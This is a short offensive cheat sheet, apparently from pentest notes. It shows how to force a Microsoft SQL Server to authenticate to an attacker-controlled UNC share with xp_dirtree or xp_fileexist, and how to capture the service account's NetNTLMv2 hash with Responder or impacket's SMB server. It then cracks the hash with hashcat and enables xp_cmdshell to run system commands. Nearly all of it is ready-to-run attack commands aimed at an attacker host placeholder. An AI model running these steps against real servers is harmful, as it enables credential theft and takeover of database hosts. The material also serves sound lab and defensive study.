# MSSQL xp_dirtree UNC NetNTLMv2 Capture

Force MSSQL to authenticate to a controlled UNC share — captures the service account's NetNTLMv2 hash.

**Start Responder:**
```bash
responder -I tun0 -v
# or impacket SMB server:
smbserver.py share /tmp/share -smb2support
```

**Trigger from MSSQL:**
```sql
EXEC master..xp_dirtree '\\<LHOST>\share'
EXEC master..xp_fileexist '\\<LHOST>\share\file'
```

**Or from mssqlclient.py:**
```bash
mssqlclient.py <domain>/<user>:<pass>@<TARGET>
SQL> xp_dirtree \\<LHOST>\share
```

**Crack the captured hash:**
```bash
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

**If the MSSQL service runs as SA or a high-privileged account**, the cracked password may allow lateral movement or direct xp_cmdshell:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
